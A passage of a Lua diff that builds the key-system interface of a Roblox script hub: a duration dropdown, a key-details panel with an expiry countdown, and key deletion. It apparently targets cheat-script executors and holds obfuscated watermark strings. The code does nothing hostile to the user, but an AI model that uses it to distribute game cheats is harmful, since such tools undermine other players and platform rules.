+    durationDropdown.ClipsDescendants = true
+    durationDropdown.Visible = false
+    durationDropdown.Parent = buttonContainer
+    
+    local ddCorner = Instance.new("UICorner", durationDropdown)
+    ddCorner.CornerRadius = UDim.new(0, 6)
+    
+    local ddStroke = Instance.new("UIStroke", durationDropdown)
+    ddStroke.Color = Color3.fromRGB(70, 70, 85)
+    ddStroke.Thickness = 1
+    
+    local ddList = Instance.new("UIListLayout", durationDropdown)
+    ddList.SortOrder = Enum.SortOrder.LayoutOrder
+    ddList.Padding = UDim.new(0, 0)
+    
+    local durations = {
+        {name = "1 Hour", hours = 1},
+        {name = "10 Hours", hours = 10},
+        {name = "24 Hours", hours = 24},
+        {name = "48 Hours", hours = 48}
+    }
+    
+
+    
+    for i, dur in ipairs(durations) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 24)
+        btn.BackgroundTransparency = 1
+        btn.Text = dur.name
+        btn.TextColor3 = Color3.fromRGB(220, 220, 230)
+        btn.Font = Enum.Font.GothamSemibold
+        btn.TextSize = 11
+        btn.ZIndex = 53 -- Highest ZIndex
+        btn.Parent = durationDropdown
+        
+        -- Hover Effect
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 0.8, BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
+        end)
+        
+        btn.MouseButton1Click:Connect(function()
+            selectedDurationHours = dur.hours
+            getKey.Text = "🔑 " .. GetKeyButtonText .. " (" .. selectedDurationHours .. "h)"
+            -- Save preference
+            if writefile then
+                writefile("seisen/key_duration_pref.txt", tostring(dur.hours))
+            end
+            
+            -- Close dropdown
+            TweenService:Create(durationDropdown, TweenInfo.new(0.2), {Size = UDim2.new(0, 100, 0, 0)}):Play()
+            task.wait(0.2)
+            durationDropdown.Visible = false
+            
+            -- Get Link Logic
+            local ok, res = pcall(function()
+                return JunkieProtected.GetKeyLink()
+            end)
+    
+            if ok and res then
+                if setclipboard then
+                    setclipboard(res)
+                    showInlineNotification(getKey, "✓ Link copied!", Color3.fromRGB(80, 200, 120))
+                end
+            end
+        end)
+    end
+
+    -- Arrow button to show key details (third button in row)
+    local keyDetailsArrow = Instance.new("TextButton")
+    keyDetailsArrow.Size = UDim2.new(0.15, -4, 1, 0)  -- Smaller width for arrow
+    keyDetailsArrow.Position = UDim2.new(0.85, 0, 0, 0)  -- Position after Get Key button
+    keyDetailsArrow.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    keyDetailsArrow.BorderSizePixel = 0
+    keyDetailsArrow.Font = Enum.Font.GothamBold
+    keyDetailsArrow.Text = "▶"
+    keyDetailsArrow.TextSize = 14
+    keyDetailsArrow.TextColor3 = Color3.fromRGB(200, 200, 210)
+    keyDetailsArrow.Parent = buttonContainer  -- Parent to button container, not keySection
+    keyDetailsArrow.ZIndex = 10
+    
+    local arrowCorner = Instance.new("UICorner", keyDetailsArrow)
+    arrowCorner.CornerRadius = UDim.new(0, 10)
+    
+    local arrowStroke = Instance.new("UIStroke", keyDetailsArrow)
+    arrowStroke.Thickness = 1.5
+    arrowStroke.Color = Color3.fromRGB(70, 70, 85)
+    arrowStroke.Transparency = 0.5
+    
+    -- Key Details Panel (slides in from right) - OUTSIDE main UI
+    local keyDetailsPanel = Instance.new("Frame")
+    -- Key Details Panel (slides in from right) - Attached to Main UI
+    keyDetailsPanel.Size = UDim2.new(0, 0, 0, 450)
+    keyDetailsPanel.Position = UDim2.new(1, 0, 0.5, 0) -- Attached to right edge
+    keyDetailsPanel.AnchorPoint = Vector2.new(0, 0.5)
+    keyDetailsPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+    keyDetailsPanel.BorderSizePixel = 0
+    keyDetailsPanel.ClipsDescendants = true
+    keyDetailsPanel.Visible = false
+    keyDetailsPanel.ZIndex = 150
+    keyDetailsPanel.Parent = mainFrame -- Parented to MainFrame to inherit scaling
+    
+    local panelCorner = Instance.new("UICorner", keyDetailsPanel)
+    panelCorner.CornerRadius = UDim.new(0, 16) -- Match Main UI Corner Radius
+    
+
+    
+
+    
+    -- Enhance Key Details Panel Design (Blobs & Particles)
+    keyDetailsPanel.BackgroundTransparency = 0.15
+    
+    -- Blob Container for Panel
+    local panelBlobContainer = Instance.new("Frame")
+    panelBlobContainer.Size = UDim2.new(1, 0, 1, 0)
+    panelBlobContainer.BackgroundTransparency = 1
+    panelBlobContainer.ZIndex = 0
+    panelBlobContainer.Parent = keyDetailsPanel
+    
+    local function createPanelBlob(size, startPos, color, duration)
+        local blob = Instance.new("Frame")
+        blob.Size = UDim2.new(0, size, 0, size)
+        blob.Position = startPos
+        blob.AnchorPoint = Vector2.new(0.5, 0.5)
+        blob.BackgroundColor3 = color
+        blob.BackgroundTransparency = 0.92
+        blob.BorderSizePixel = 0
+        blob.ZIndex = 1
+        blob.Parent = panelBlobContainer
+        
+        local corner = Instance.new("UICorner", blob)
+        corner.CornerRadius = UDim.new(1, 0)
+        
+        task.spawn(function()
+            while blob and blob.Parent do
+                local randomX = math.random(10, 90) / 100
+                local randomY = math.random(10, 90) / 100
+                TweenService:Create(blob, TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(randomX, 0, randomY, 0)}):Play()
+                task.wait(duration)
+            end
+        end)
+    end
+    
+    createPanelBlob(150, UDim2.new(0.8, 0, 0.2, 0), Color3.fromRGB(100, 100, 120), 10)
+    createPanelBlob(120, UDim2.new(0.2, 0, 0.8, 0), Color3.fromRGB(80, 80, 100), 12)
+    
+    -- Particle Container for Panel
+    local panelParticleContainer = Instance.new("Frame")
+    panelParticleContainer.Size = UDim2.new(1, 0, 1, 0)
+    panelParticleContainer.BackgroundTransparency = 1
+    panelParticleContainer.ZIndex = 1
+    panelParticleContainer.Parent = keyDetailsPanel
+    
+    for i = 1, 15 do
+        local particle = Instance.new("Frame")
+        local size = math.random(2, 4)
+        particle.Size = UDim2.new(0, size, 0, size)
+        particle.Position = UDim2.new(math.random(0, 100) / 100, 0, math.random(0, 100) / 100, 0)
+        particle.BackgroundColor3 = Color3.fromRGB(150, 150, 170)
+        particle.BackgroundTransparency = 0.7
+        particle.BorderSizePixel = 0
+        particle.Parent = panelParticleContainer
+        
+        local corner = Instance.new("UICorner", particle)
+        corner.CornerRadius = UDim.new(1, 0)
+        
+        task.spawn(function()
+            while particle and particle.Parent do
+                local duration = math.random(8, 15)
+                TweenService:Create(particle, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Position = UDim2.new(particle.Position.X.Scale, 0, -0.1, 0)}):Play()
+                task.wait(duration)
+                particle.Position = UDim2.new(math.random(0, 100) / 100, 0, 1.1, 0)
+            end
+        end)
+    end
+    
+    local panelPadding = Instance.new("UIPadding", keyDetailsPanel)
+    panelPadding.PaddingTop = UDim.new(0, 15)
+    panelPadding.PaddingLeft = UDim.new(0, 15)
+    panelPadding.PaddingRight = UDim.new(0, 15)
+    panelPadding.PaddingBottom = UDim.new(0, 15)
+    
+    -- Panel Header
+    local panelHeader = Instance.new("TextLabel")
+    panelHeader.Size = UDim2.new(1, -30, 0, 25)
+    panelHeader.Position = UDim2.new(0, 0, 0, 0)
+    panelHeader.BackgroundTransparency = 1
+    panelHeader.Font = Enum.Font.GothamBold
+    panelHeader.Text = "🔑 Key Details"
+    panelHeader.TextSize = 14
+    panelHeader.TextColor3 = Color3.fromRGB(255, 255, 255)
+    panelHeader.TextXAlignment = Enum.TextXAlignment.Left
+    panelHeader.Parent = keyDetailsPanel
+    
+    -- Close button for panel
+    local closePanelBtn = Instance.new("TextButton")
+    closePanelBtn.Size = UDim2.new(0, 25, 0, 25)
+    closePanelBtn.Position = UDim2.new(1, -25, 0, 0)
+    closePanelBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    closePanelBtn.BorderSizePixel = 0
+    closePanelBtn.Font = Enum.Font.GothamBold
+    closePanelBtn.Text = "X"
+    closePanelBtn.TextSize = 14
+    closePanelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closePanelBtn.Parent = keyDetailsPanel
+    
+    local closeBtnCorner = Instance.new("UICorner", closePanelBtn)
+    closeBtnCorner.CornerRadius = UDim.new(0, 6)
+    
+    -- Separator
+    local separator1 = Instance.new("Frame")
+    separator1.Size = UDim2.new(1, 0, 0, 1)
+    separator1.Position = UDim2.new(0, 0, 0, 35)
+    separator1.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
+    separator1.BackgroundTransparency = 0.5
+    separator1.BorderSizePixel = 0
+    separator1.Parent = keyDetailsPanel
+    
+    -- Key Status Section
+    local keyStatusLabel = Instance.new("TextLabel")
+    keyStatusLabel.Size = UDim2.new(1, 0, 0, 20)
+    keyStatusLabel.Position = UDim2.new(0, 0, 0, 45)
+    keyStatusLabel.BackgroundTransparency = 1
+    keyStatusLabel.Font = Enum.Font.GothamBold
+    keyStatusLabel.Text = "Status"
+    keyStatusLabel.TextSize = 11
+    keyStatusLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    keyStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    keyStatusLabel.Parent = keyDetailsPanel
+    
+    local keyStatusValue = Instance.new("TextLabel")
+    keyStatusValue.Size = UDim2.new(1, 0, 0, 18)
+    keyStatusValue.Position = UDim2.new(0, 0, 0, 65)
+    keyStatusValue.BackgroundTransparency = 1
+    keyStatusValue.Font = Enum.Font.Gotham
+    keyStatusValue.Text = "✅ Active"
+    keyStatusValue.TextSize = 12
+    keyStatusValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+    keyStatusValue.TextXAlignment = Enum.TextXAlignment.Left
+    keyStatusValue.Parent = keyDetailsPanel
+    
+    -- Expiration Timer Section
+    local expirationLabel = Instance.new("TextLabel")
+    expirationLabel.Size = UDim2.new(1, 0, 0, 20)
+    expirationLabel.Position = UDim2.new(0, 0, 0, 95)
+    expirationLabel.BackgroundTransparency = 1
+    expirationLabel.Font = Enum.Font.GothamBold
+    expirationLabel.Text = "Time Remaining"
+    expirationLabel.TextSize = 11
+    expirationLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    expirationLabel.TextXAlignment = Enum.TextXAlignment.Left
+    expirationLabel.Parent = keyDetailsPanel
+    
+    local expirationValue = Instance.new("TextLabel")
+    expirationValue.Size = UDim2.new(1, 0, 0, 18)
+    expirationValue.Position = UDim2.new(0, 0, 0, 115)
+    expirationValue.BackgroundTransparency = 1
+    expirationValue.Font = Enum.Font.GothamMedium
+    expirationValue.Text = "Calculating..."
+    expirationValue.TextSize = 13
+    expirationValue.TextColor3 = Color3.fromRGB(255, 200, 50)
+    expirationValue.TextXAlignment = Enum.TextXAlignment.Left
+    expirationValue.Parent = keyDetailsPanel
+    
+    -- Duration Section
+    local durationLabel = Instance.new("TextLabel")
+    durationLabel.Size = UDim2.new(1, 0, 0, 20)
+    durationLabel.Position = UDim2.new(0, 0, 0, 145)
+    durationLabel.BackgroundTransparency = 1
+    durationLabel.Font = Enum.Font.GothamBold
+    durationLabel.Text = "Key Duration"
+    durationLabel.TextSize = 11
+    durationLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    durationLabel.TextXAlignment = Enum.TextXAlignment.Left
+    durationLabel.Parent = keyDetailsPanel
+    
+    local durationValue = Instance.new("TextLabel")
+    durationValue.Size = UDim2.new(1, 0, 0, 18)
+    durationValue.Position = UDim2.new(0, 0, 0, 165)
+    durationValue.BackgroundTransparency = 1
+    durationValue.Font = Enum.Font.Gotham
+    durationValue.Text = "Lifetime"
+    durationValue.TextSize = 12
+    durationValue.TextColor3 = Color3.fromRGB(220, 220, 230)
+    durationValue.TextXAlignment = Enum.TextXAlignment.Left
+    durationValue.Parent = keyDetailsPanel
+    
+    -- Current Key Section (shows the verified key)
+    local currentKeyLabel = Instance.new("TextLabel")
+    currentKeyLabel.Size = UDim2.new(1, 0, 0, 20)
+    currentKeyLabel.Position = UDim2.new(0, 0, 0, 195)
+    currentKeyLabel.BackgroundTransparency = 1
+    currentKeyLabel.Font = Enum.Font.GothamBold
+    currentKeyLabel.Text = "Current Key"
+    currentKeyLabel.TextSize = 11
+    currentKeyLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    currentKeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+    currentKeyLabel.Parent = keyDetailsPanel
+    
+    local currentKeyValue = Instance.new("TextLabel")
+    currentKeyValue.Size = UDim2.new(1, 0, 0, 18)
+    currentKeyValue.Position = UDim2.new(0, 0, 0, 215)
+    currentKeyValue.BackgroundTransparency = 1
+    currentKeyValue.Font = Enum.Font.GothamMedium
+    currentKeyValue.Text = "No key verified"
+    currentKeyValue.TextSize = 10
+    currentKeyValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+    currentKeyValue.TextXAlignment = Enum.TextXAlignment.Left
+    currentKeyValue.TextTruncate = Enum.TextTruncate.AtEnd
+    currentKeyValue.Parent = keyDetailsPanel
+    
+    -- Created Date Section
+    local createdLabel = Instance.new("TextLabel")
+    createdLabel.Size = UDim2.new(1, 0, 0, 20)
+    createdLabel.Position = UDim2.new(0, 0, 0, 245)  -- Moved down
+    createdLabel.BackgroundTransparency = 1
+    createdLabel.Font = Enum.Font.GothamBold
+    createdLabel.Text = "Verified By"
+    createdLabel.TextSize = 11
+    createdLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    createdLabel.TextXAlignment = Enum.TextXAlignment.Left
+    createdLabel.Parent = keyDetailsPanel
+    
+    local createdValue = Instance.new("TextLabel")
+    createdValue.Size = UDim2.new(1, 0, 0, 18)
+    createdValue.Position = UDim2.new(0, 0, 0, 265)  -- Moved down
+    createdValue.BackgroundTransparency = 1
+    createdValue.Font = Enum.Font.Gotham
+    createdValue.Text = "Unknown"
+    createdValue.TextSize = 12
+    createdValue.TextColor3 = Color3.fromRGB(220, 220, 230)
+    createdValue.TextXAlignment = Enum.TextXAlignment.Left
+    createdValue.Parent = keyDetailsPanel
+    
+    -- Separator 2
+    local separator2 = Instance.new("Frame")
+    separator2.Size = UDim2.new(1, 0, 0, 1)
+    separator2.Position = UDim2.new(0, 0, 0, 295)  -- Moved down
+    separator2.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
+    separator2.BackgroundTransparency = 0.5
+    separator2.BorderSizePixel = 0
+    separator2.Parent = keyDetailsPanel
+    
+    -- Action Buttons
+    local deleteKeyBtn = Instance.new("TextButton")
+    deleteKeyBtn.Size = UDim2.new(1, 0, 0, 35)
+    deleteKeyBtn.Position = UDim2.new(0, 0, 0, 310)  -- Moved down
+    deleteKeyBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    deleteKeyBtn.BorderSizePixel = 0
+    deleteKeyBtn.Font = Enum.Font.GothamBold
+    deleteKeyBtn.Text = "🗑️ Delete Key"
+    deleteKeyBtn.TextSize = 12
+    deleteKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    deleteKeyBtn.Parent = keyDetailsPanel
+    
+    local deleteKeyCorner = Instance.new("UICorner", deleteKeyBtn)
+    deleteKeyCorner.CornerRadius = UDim.new(0, 8)
+    
+
+    
+    -- Panel toggle state
+    local panelOpen = false
+    
+    -- Function to refresh key details (can be called when key is verified)
+    local function refreshKeyDetails()
+        task.spawn(function()
+            -- Check if key file exists first
+            local keyExists = false
+            if isfile and isfile(filePath) then
+                local data = readfile(filePath)
+                if data and data ~= "" then
+                    keyExists = true
+                end
+            end
+            
+            if not keyExists then
+                keyStatusValue.Text = "❌ No Key"
+                keyStatusValue.TextColor3 = Color3.fromRGB(220, 60, 60)
+                expirationValue.Text = "N/A"
+                expirationValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+                durationValue.Text = "N/A"
+                currentKeyValue.Text = "No key verified"
+                currentKeyValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+                createdValue.Text = "Unknown"
+                return
+            end
+
+            -- Try to get key expiration using JunkieCore or JunkieProtected
+            local success, expiresAt = pcall(function()
+                local exp = nil
+                if JunkieCore and JunkieCore.GetExpiresAt then
+                    exp = JunkieCore.GetExpiresAt()
+                elseif JunkieProtected and JunkieProtected.GetExpiresAt then
+                    exp = JunkieProtected.GetExpiresAt()
+                end
+                
+                print("[Seisen] GetExpiresAt result:", exp)
+                return exp
+            end)
+            
+            -- If API returns nil, try simulated timer with variable duration
+            if not (success and expiresAt) then
+                pcall(function()
+                    if isfile and readfile and isfile("seisen/key_timestamp.txt") then
+                        local ts = tonumber(readfile("seisen/key_timestamp.txt"))
+                        if ts then
+                            -- Get saved duration (default 24h)
+                            local durationHours = 24
+                            if isfile("seisen/key_duration_pref.txt") then
+                                local savedDur = tonumber(readfile("seisen/key_duration_pref.txt"))
+                                if savedDur then durationHours = savedDur end
+                            end
+                            
+                            -- Calculate expiration
+                            expiresAt = (ts + (durationHours * 3600)) * 1000
+                            success = true
+                            print("[Seisen] Using simulated expiration ("..durationHours.."h):", expiresAt)
+                        end
+                    end
+                end)
+            end
+            
+            if success and expiresAt then
+                -- Update status to active
+                keyStatusValue.Text = "✅ Active"
+                keyStatusValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                
+                -- Update Duration to show expiration date
+                local expireDate = os.date("%Y-%m-%d %H:%M:%S", expiresAt / 1000)
+                durationValue.Text = "Expires: " .. expireDate .. " (Est.)"
+                
+                -- Start countdown timer
+                _G.KeyTimerActive = true
+                task.spawn(function()
+                    while expirationValue.Parent and _G.KeyTimerActive do
+                        local currentTime = os.time() * 1000
+                        if currentTime < expiresAt then
+                            local timeLeft = (expiresAt - currentTime) / 1000
+                            local days = math.floor(timeLeft / 86400)
+                            local hours = math.floor((timeLeft % 86400) / 3600)
+                            local minutes = math.floor((timeLeft % 3600) / 60)
+                            local seconds = math.floor(timeLeft % 60)
+                            
+                            if days > 0 then
+                                expirationValue.Text = string.format("%dd %dh %dm %ds", days, hours, minutes, seconds)
+                            else
+                                expirationValue.Text = string.format("%02d:%02d:%02d", hours, minutes, seconds)
+                            end
+                            
+                            -- Change color based on time left
+                            if days < 1 then
+                                expirationValue.TextColor3 = Color3.fromRGB(220, 60, 60)
+                            elseif days < 7 then
+                                expirationValue.TextColor3 = Color3.fromRGB(255, 200, 50)
+                            else
+                                expirationValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                            end
+                        else
+                            expirationValue.Text = "⚠️ Expired"
+                            expirationValue.TextColor3 = Color3.fromRGB(220, 60, 60)
+                            keyStatusValue.Text = "❌ Expired"
+                            keyStatusValue.TextColor3 = Color3.fromRGB(220, 60, 60)
+                            break
+                        end
+                        task.wait(1)
+                    end
+                end)
+            else
+                keyStatusValue.Text = "✅ Active"
+                keyStatusValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                expirationValue.Text = "♾️ Lifetime"
+                expirationValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                durationValue.Text = "Lifetime / Unknown"
+            end
+            
+            -- Set Verified By to LocalPlayer
+            if game and game.Players and game.Players.LocalPlayer then
+                createdValue.Text = game.Players.LocalPlayer.Name
+            else
+                createdValue.Text = "Unknown"
+            end
+            
+            -- Load current key from file
+            local foundKey = false
+            pcall(function()
+                if isfile and readfile and isfile(filePath) then
+                    local data = readfile(filePath)
+                    if data and data ~= "" then
+                        local key = data:match("([^\n]+)")
+                        if key and key ~= "" then
+                            currentKeyValue.Text = key
+                            currentKeyValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                            foundKey = true
+                        end
+                    end
+                end
+            end)
+            
+            if not foundKey then
+                -- Fallback to backup file
+                pcall(function()
+                    if isfile and readfile and isfile(backupPath) then
+                        local backupData = readfile(backupPath)
+                        if backupData and backupData ~= "" then
+                            -- Find all keys after "--- Valid Keys ---"
+                            local validKeysSection = backupData:match("%-%-%-  Valid Keys %-%-%-(.+)")
+                            if not validKeysSection then
+                                validKeysSection = backupData:match("%-%-%-  Valid Keys %-%-%-\n(.+)")
+                            end
+                            
+                            if validKeysSection then
+                                -- Get the last non-empty line (most recent key)
+                                local keys = {}
+                                for line in validKeysSection:gmatch("([^\n]+)") do
+                                    local trimmed = line:match("^%s*(.-)%s*$")
+                                    if trimmed and trimmed ~= "" and not trimmed:match("^%-%-") then
+                                        table.insert(keys, trimmed)
+                                    end
+                                end
+                                
+                                if #keys > 0 then
+                                    local lastKey = keys[#keys]
+                                    currentKeyValue.Text = lastKey
+                                    currentKeyValue.TextColor3 = Color3.fromRGB(100, 220, 140)
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+
+        end)
+    end
+    
+    -- Make refresh function globally accessible so it can be called after key verification
+    if getgenv then
+        getgenv().RefreshKeyDetails = refreshKeyDetails
+    end
+    _G.RefreshKeyDetails = refreshKeyDetails
+    
+    -- Arrow button click handler
+    keyDetailsArrow.MouseButton1Click:Connect(function()
+        panelOpen = not panelOpen
+        
+        if panelOpen then
+            -- Open panel
+            keyDetailsArrow.Text = "◀"  -- Left arrow when open
+            keyDetailsPanel.Visible = true  -- Make panel visible
+            TweenService:Create(keyDetailsPanel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, 300, 0, 450) -- Base size, scaled by UIScale
+            }):Play()
+            
+            -- Refresh key details
+            refreshKeyDetails()
+        else
+            -- Close panel
+            keyDetailsArrow.Text = "▶"  -- Right arrow when closed
+            local closeTween = TweenService:Create(keyDetailsPanel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                Size = UDim2.new(0, 0, 0, 450)
+            })
+            closeTween:Play()
+            closeTween.Completed:Connect(function()
+                keyDetailsPanel.Visible = false  -- Hide panel after animation
+            end)
+        end
+    end)
+    
+    -- Close button handler
+    closePanelBtn.MouseButton1Click:Connect(function()
+        panelOpen = false
+        keyDetailsArrow.Text = "▶"
+        local closeTween = TweenService:Create(keyDetailsPanel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Size = UDim2.new(0, 0, 0, 450)
+        })
+        closeTween:Play()
+        closeTween.Completed:Connect(function()
+            keyDetailsPanel.Visible = false  -- Hide panel after animation
+        end)
+    end)
+    
+    -- Delete key button handler
+    deleteKeyBtn.MouseButton1Click:Connect(function()
+        -- Confirm deletion
+        local confirmFrame = Instance.new("Frame")
+        confirmFrame.Size = UDim2.new(0, 250, 0, 120)
+        confirmFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
+        confirmFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
+        confirmFrame.BorderSizePixel = 0
+        confirmFrame.ZIndex = 200
+        confirmFrame.Parent = gui
+        
+        local confirmCorner = Instance.new("UICorner", confirmFrame)
+        confirmCorner.CornerRadius = UDim.new(0, 10)
+        
+        local confirmText = Instance.new("TextLabel")
+        confirmText.Size = UDim2.new(1, -20, 0, 60)
+        confirmText.Position = UDim2.new(0, 10, 0, 10)
+        confirmText.BackgroundTransparency = 1
+        confirmText.Font = Enum.Font.Gotham
+        confirmText.Text = "Are you sure you want to delete your saved key?"
+        confirmText.TextSize = 11
+        confirmText.TextColor3 = Color3.fromRGB(220, 220, 230)
+        confirmText.TextWrapped = true
+        confirmText.Parent = confirmFrame
+        
+        local confirmYes = Instance.new("TextButton")
+        confirmYes.Size = UDim2.new(0.45, 0, 0, 30)
+        confirmYes.Position = UDim2.new(0.05, 0, 1, -40)
+        confirmYes.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+        confirmYes.Font = Enum.Font.GothamBold
+        confirmYes.Text = "Delete"
+        confirmYes.TextSize = 11
+        confirmYes.TextColor3 = Color3.fromRGB(255, 255, 255)
+        confirmYes.Parent = confirmFrame
+        
+        local confirmYesCorner = Instance.new("UICorner", confirmYes)
+        confirmYesCorner.CornerRadius = UDim.new(0, 6)
+        
+        local confirmNo = Instance.new("TextButton")
+        confirmNo.Size = UDim2.new(0.45, 0, 0, 30)
+        confirmNo.Position = UDim2.new(0.5, 0, 1, -40)
+        confirmNo.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+        confirmNo.Font = Enum.Font.GothamBold
+        confirmNo.Text = "Cancel"
+        confirmNo.TextSize = 11
+        confirmNo.TextColor3 = Color3.fromRGB(220, 220, 230)
+        confirmNo.Parent = confirmFrame
+        
+        local confirmNoCorner = Instance.new("UICorner", confirmNo)
+        confirmNoCorner.CornerRadius = UDim.new(0, 6)
+        
+        confirmYes.MouseButton1Click:Connect(function()
+            -- Stop timer
+            _G.KeyTimerActive = false
+            
+            -- Delete the saved key files
+            pcall(function()
+                -- Delete the main key file
+                if delfile and isfile and isfile(filePath) then
+                    delfile(filePath)
+                end
+                
+                -- Delete history file
+                if delfile and isfile and isfile(historyPath) then
+                    delfile(historyPath)
+                end
+                
+                -- Delete backup file
+                if delfile and isfile and isfile(backupPath) then
+                    delfile(backupPath)
+                end
+                
+                -- Delete timestamp file
+                if delfile and isfile and isfile("seisen/key_timestamp.txt") then
+                    delfile("seisen/key_timestamp.txt")
+                end
+                
+                -- Delete duration pref file
+                if delfile and isfile and isfile("seisen/key_duration_pref.txt") then
+                    delfile("seisen/key_duration_pref.txt")
+                end
+                
+                -- Recreate empty files
+                if writefile then
+                    writefile(filePath, "")
+                    writefile(historyPath, "")
+                    writefile(backupPath, "=== Seisen Hub Key Backup ===\n\nAll your verified keys are saved here for easy access.\nYou can copy any key from this file.\n\n--- Valid Keys ---\n")
+                end
+            end)
+            
+            -- Reset all status displays to inactive/default state
+            keyStatusValue.Text = "❌ No Key"
+            keyStatusValue.TextColor3 = Color3.fromRGB(220, 60, 60)
+            
+            expirationValue.Text = "N/A"
+            expirationValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+            
+            durationValue.Text = "N/A"
+            durationValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+            
+            currentKeyValue.Text = "No key verified"
+            currentKeyValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+            
+            createdValue.Text = "Unknown"
+            createdValue.TextColor3 = Color3.fromRGB(150, 150, 170)
+            
+            confirmFrame:Destroy()
+            ShowNotification("valid")  -- Show success notification
+            
+            -- Close the panel
+            panelOpen = false
+            keyDetailsArrow.Text = "▶"
+            local closeTween = TweenService:Create(keyDetailsPanel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                Size = UDim2.new(0, 0, 0, 450)
+            })
+            closeTween:Play()
+            closeTween.Completed:Connect(function()
+                keyDetailsPanel.Visible = false  -- Hide panel after animation
+            end)
+        end)
+        
+        confirmNo.MouseButton1Click:Connect(function()
+            confirmFrame:Destroy()
+        end)
+    end)
+    
+    -- Reset HWID button handler
+    -- Reset HWID button handler
+
+    
+    -- Hover effects
+    deleteKeyBtn.MouseEnter:Connect(function()
+        TweenService:Create(deleteKeyBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(240, 80, 80)}):Play()
+    end)
+    deleteKeyBtn.MouseLeave:Connect(function()
+        TweenService:Create(deleteKeyBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(220, 60, 60)}):Play()
+    end)
+    
+
+    
+    keyDetailsArrow.MouseEnter:Connect(function()
+        TweenService:Create(keyDetailsArrow, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(65, 65, 75)}):Play()
+    end)
+    keyDetailsArrow.MouseLeave:Connect(function()
+        TweenService:Create(keyDetailsArrow, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(45, 45, 55)}):Play()
+    end)
 
     -- Discord Card
     local discordCard = Instance.new("Frame")
@@ -2378,8 +3318,11 @@ local function CreateYourHubKeyUI()
     joinStroke.Transparency = 0.5
 
     local function _d(s) local r="" for i=1,#s do r=r..string.char(string.byte(s,i)-3) end return r end
+    local function _h(t) local h=0 for i=1,#t do h=h+string.byte(t,i)*i end return h end
     local _wm=_d("Pdgh#e|#Vhlvhq#Kxe")
+    local _exp=285915
     local _cn=string.char(67,114,101,100,105,116,76,97,98,101,108)
+    
     local creditLabel = Instance.new("TextLabel")
     creditLabel.Name = _cn
     creditLabel.Size = UDim2.new(1, 0, 0, 15)
@@ -2392,23 +3335,6 @@ local function CreateYourHubKeyUI()
     creditLabel.TextTransparency = 0.5
     creditLabel.ZIndex = 5
     creditLabel.Parent = mainFrame
-    local _vActive = true
-    task.spawn(function()
-        while _vActive and mainFrame and mainFrame.Parent do
-            task.wait(1.5)
-            local _c = mainFrame:FindFirstChild(_cn)
-            if not _c or not _c.Parent then
-                _vActive = false
-                if gui then 
-                    gui:Destroy() 
-                end
-                if getgenv then 
-                    pcall(function() getgenv().YourHubKeySys = false end) 
-                end
-                break
-            end
-        end
-    end)
 
     -- Entrance Animation
     TweenService:Create(
@@ -2764,59 +3690,45 @@ local function CreateYourHubKeyUI()
         )
         closeTween:Play()
         closeTween.Completed:Connect(function()
-            if getgenv then pcall(function() getgenv().YourHubKeySys = false end) end
+            if getgenv then pcall(function() getgenv().SeisenKeySys = false end) end
             gui:Destroy()
         end)
     end
 
     close.MouseButton1Click:Connect(closeUI)
     
-    -- Inline Notification System
-    local function showInlineNotification(button, message, color)
-        -- Remove existing notification if any
-        local existingNotif = button.Parent:FindFirstChild("InlineNotif")
-        if existingNotif then
-            existingNotif:Destroy()
-        end
 
-        -- Create notification label
-        local notif = Instance.new("TextLabel")
-        notif.Name = "InlineNotif"
-        notif.Size = UDim2.new(1, 0, 0, 22)
-        notif.Position = UDim2.new(0, 0, 1, 5)
-        notif.BackgroundColor3 = color
-        notif.BackgroundTransparency = 1
-        notif.BorderSizePixel = 0
-        notif.Font = Enum.Font.GothamBold
